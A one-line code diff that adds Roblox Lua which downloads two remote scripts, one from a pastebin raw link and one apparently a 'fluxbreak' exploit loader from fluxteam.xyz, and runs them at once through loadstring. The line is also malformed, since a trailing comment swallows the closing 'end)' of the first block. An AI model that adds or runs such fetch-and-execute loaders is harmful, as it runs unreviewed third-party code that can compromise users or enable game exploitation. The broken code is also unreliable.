@@ -1,0 +1,1 @@
+spawn(function()loadstring(game:HttpGet("https://pastebin.com/raw/qUPwqTyr", true))() --sirelkillaend)spawn(function()	loadstring(game:HttpGet(("https://fluxteam.xyz/scripts/fluxbreak/fluxbreak.lua"), true))()end
